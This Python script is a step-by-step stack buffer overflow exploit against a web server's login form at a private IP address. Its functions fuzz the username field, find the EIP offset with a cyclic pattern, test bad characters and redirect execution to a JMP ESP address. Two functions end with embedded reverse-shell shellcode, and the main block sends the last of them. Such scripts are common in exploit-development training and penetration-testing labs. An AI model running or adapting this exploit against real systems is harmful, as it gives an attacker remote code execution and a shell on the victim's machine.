#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import time
import sys


hostname = '192.168.178.79'
timeout_in_seconds = 200

def request_call(payload):
    try:
        print("\nSending evil buffer with")
        print(payload)
        print(payload)

        content = "username=" + payload + "&password=a"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: " + hostname + "\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://" + hostname + "/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " + str(len(content)) + "\r\n"
        buffer += "\r\n"
        buffer += content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout_in_seconds)
        s.connect((hostname, 80))
        s.send(buffer)

        data = s.recv(4096)
        print(data)
        time.sleep(2)
        s.close()







        # data = {"username": payload.encode(), "password": "A"}
        #
        # headers = {
        #     'content-type': 'application/x-www-form-urlencoded',
        #     'User-Agent': 'Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        #     'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        #     'Accept-Language':'en-US,en;q=0.5',
        #     'Referer': f'http://{hostname}/login',
        #     'Connection': 'close',
        #     'Content-Length': str(len(data))
        # }
        #
        #
        # url = 'http://' + hostname + '/login'
        # response = requests.post(url, params=data, headers=headers)
        # print(response)
        #
        #




    except Exception as e:
        print("\nCould not connect: " + str(e))
        sys.exit()

def loop_payload():
    size = 100
    while(size < 2000):
        print("\nSending evil buffer with " + size + " bytes")
        inputBuffer = "A" * size
        request_call(inputBuffer)
        size += 100

def fix_payload():
    # adjusted to 800
    input_buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba'
    request_call(input_buffer)


def locate_EIP():
    filler = b"A" * 780
    eip = b"B" * 4
    buffer = b"C" * 16
    input_buffer = filler + eip + buffer
    request_call(input_buffer)


def allocate_more_space():
    filler = "A" * 780
    eip = "B" * 4
    offset = "C" * 4
    buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
    input_buffer = filler + eip + offset + buffer
    request_call(input_buffer)

def checking_bad_chars():
    badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

    filler = "A" * 780
    eip = "B" * 4
    offset = "C" * 4
    input_buffer = filler + eip + offset + badchars
    request_call(input_buffer)


# After getting JMP ESP address with mona script in debugger. CHECK compiler secu flags
def pointing_the_eip():
    filler = "A" * 780
    eip = '\x83\x0c\x09\x10'
    offset = "C" * 4
    buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
    input_buffer = filler + eip + offset + buffer
    request_call(input_buffer)



def reverse_shell():

    shellcode = (
        "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
        "\xa9\xb5\xd7\x10\x83\xee\xfc\xe2\xf4\x55\x5d\x55\x10\xa9\xb5"
        "\xb7\x99\x4c\x84\x17\x74\x22\xe5\xe7\x9b\xfb\xb9\x5c\x42\xbd"
        "\x3e\xa5\x38\xa6\x02\x9d\x36\x98\x4a\x7b\x2c\xc8\xc9\xd5\x3c"
        "\x89\x74\x18\x1d\xa8\x72\x35\xe2\xfb\xe2\x5c\x42\xb9\x3e\x9d"
        "\x2c\x22\xf9\xc6\x68\x4a\xfd\xd6\xc1\xf8\x3e\x8e\x30\xa8\x66"
        "\x5c\x59\xb1\x56\xed\x59\x22\x81\x5c\x11\x7f\x84\x28\xbc\x68"
        "\x7a\xda\x11\x6e\x8d\x37\x65\x5f\xb6\xaa\xe8\x92\xc8\xf3\x65"
        "\x4d\xed\x5c\x48\x8d\xb4\x04\x76\x22\xb9\x9c\x9b\xf1\xa9\xd6"
        "\xc3\x22\xb1\x5c\x11\x79\x3c\x93\x34\x8d\xee\x8c\x71\xf0\xef"
        "\x86\xef\x49\xea\x88\x4a\x22\xa7\x3c\x9d\xf4\xdd\xe4\x22\xa9"
        "\xb5\xbf\x67\xda\x87\x88\x44\xc1\xf9\xa0\x36\xae\x4a\x02\xa8"
        "\x39\xb4\xd7\x10\x80\x71\x83\x40\xc1\x9c\x57\x7b\xa9\x4a\x02"
        "\x40\xf9\xe5\x87\x50\xf9\xf5\x87\x78\x43\xba\x08\xf0\x56\x60"
        "\x40\x7a\xac\xdd\x17\xb8\x1b\xfb\xbf\x12\xa9\xa4\x8b\x99\x4f"
        "\xdf\xc7\x46\xfe\xdd\x4e\xb5\xdd\xd4\x28\xc5\x2c\x75\xa3\x1c"
        "\x56\xfb\xdf\x65\x45\xdd\x27\xa5\x0b\xe3\x28\xc5\xc1\xd6\xba"
        "\x74\xa9\x3c\x34\x47\xfe\xe2\xe6\xe6\xc3\xa7\x8e\x46\x4b\x48"
        "\xb1\xd7\xed\x91\xeb\x11\xa8\x38\x93\x34\xb9\x73\xd7\x54\xfd"
        "\xe5\x81\x46\xff\xf3\x81\x5e\xff\xe3\x84\x46\xc1\xcc\x1b\x2f"
        "\x2f\x4a\x02\x99\x49\xfb\x81\x56\x56\x85\xbf\x18\x2e\xa8\xb7"
        "\xef\x7c\x0e\x27\xa5\x0b\xe3\xbf\xb6\x3c\x08\x4a\xef\x7c\x89"
        "\xd1\x6c\xa3\x35\x2c\xf0\xdc\xb0\x6c\x57\xba\xc7\xb8\x7a\xa9"
        "\xe6\x28\xc5"
    )

    filler = "A" * 780
    eip = '\x83\x0c\x09\x10'
    offset = "C" * 4
    nops = "\x90" * 10
    input_buffer = filler + eip + offset + nops + shellcode
    request_call(input_buffer)

def reverse_shell_thread():

    shellcode = (
        "\xbf\xe3\xad\xf3\x1b\xda\xc4\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
        "\x52\x31\x7d\x12\x03\x7d\x12\x83\x0e\x51\x11\xee\x2c\x42\x54"
        "\x11\xcc\x93\x39\x9b\x29\xa2\x79\xff\x3a\x95\x49\x8b\x6e\x1a"
        "\x21\xd9\x9a\xa9\x47\xf6\xad\x1a\xed\x20\x80\x9b\x5e\x10\x83"
        "\x1f\x9d\x45\x63\x21\x6e\x98\x62\x66\x93\x51\x36\x3f\xdf\xc4"
        "\xa6\x34\x95\xd4\x4d\x06\x3b\x5d\xb2\xdf\x3a\x4c\x65\x6b\x65"
        "\x4e\x84\xb8\x1d\xc7\x9e\xdd\x18\x91\x15\x15\xd6\x20\xff\x67"
        "\x17\x8e\x3e\x48\xea\xce\x07\x6f\x15\xa5\x71\x93\xa8\xbe\x46"
        "\xe9\x76\x4a\x5c\x49\xfc\xec\xb8\x6b\xd1\x6b\x4b\x67\x9e\xf8"
        "\x13\x64\x21\x2c\x28\x90\xaa\xd3\xfe\x10\xe8\xf7\xda\x79\xaa"
        "\x96\x7b\x24\x1d\xa6\x9b\x87\xc2\x02\xd0\x2a\x16\x3f\xbb\x22"
        "\xdb\x72\x43\xb3\x73\x04\x30\x81\xdc\xbe\xde\xa9\x95\x18\x19"
        "\xcd\x8f\xdd\xb5\x30\x30\x1e\x9c\xf6\x64\x4e\xb6\xdf\x04\x05"
        "\x46\xdf\xd0\x8a\x16\x4f\x8b\x6a\xc6\x2f\x7b\x03\x0c\xa0\xa4"
        "\x33\x2f\x6a\xcd\xde\xca\xfd\x32\xb6\x66\xb3\xda\xc5\x86\x5d"
        "\x47\x43\x60\x37\x67\x05\x3b\xa0\x1e\x0c\xb7\x51\xde\x9a\xb2"
        "\x52\x54\x29\x43\x1c\x9d\x44\x57\xc9\x6d\x13\x05\x5c\x71\x89"
        "\x21\x02\xe0\x56\xb1\x4d\x19\xc1\xe6\x1a\xef\x18\x62\xb7\x56"
        "\xb3\x90\x4a\x0e\xfc\x10\x91\xf3\x03\x99\x54\x4f\x20\x89\xa0"
        "\x50\x6c\xfd\x7c\x07\x3a\xab\x3a\xf1\x8c\x05\x95\xae\x46\xc1"
        "\x60\x9d\x58\x97\x6c\xc8\x2e\x77\xdc\xa5\x76\x88\xd1\x21\x7f"
        "\xf1\x0f\xd2\x80\x28\x94\xf2\x62\xf8\xe1\x9a\x3a\x69\x48\xc7"
        "\xbc\x44\x8f\xfe\x3e\x6c\x70\x05\x5e\x05\x75\x41\xd8\xf6\x07"
        "\xda\x8d\xf8\xb4\xdb\x87"
    )

    filler = "A" * 780
    eip = '\x83\x0c\x09\x10'
    offset = "C" * 4
    nops = "\x90" * 10
    input_buffer = filler + eip + offset + nops + shellcode
    request_call(input_buffer)

if __name__ == "__main__":
    # loop_payload()
    # fix_payload()
    # locate_EIP()
    # allocate_more_space()
    # checking_bad_chars()
    # pointing_the_eip()
    # reverse_shell()
    reverse_shell_thread()





